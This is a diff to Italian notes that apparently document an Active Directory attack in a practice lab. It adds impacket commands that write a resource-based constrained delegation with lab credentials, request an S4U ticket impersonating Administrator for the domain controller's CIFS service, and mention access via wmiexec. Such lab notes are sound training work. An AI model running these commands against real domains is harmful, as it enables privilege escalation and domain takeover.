@@ -46,5 +46,8 @@ aggiungo la delegation sul target da X (rbcd$)
 ```bash
 impacket-rbcd -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
 ```
-
-
+Ora che abbiamo la delegazione possiamo fare S4U
+```bash
+impacket-getST -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'
+```
+ed accedere con wmiexec
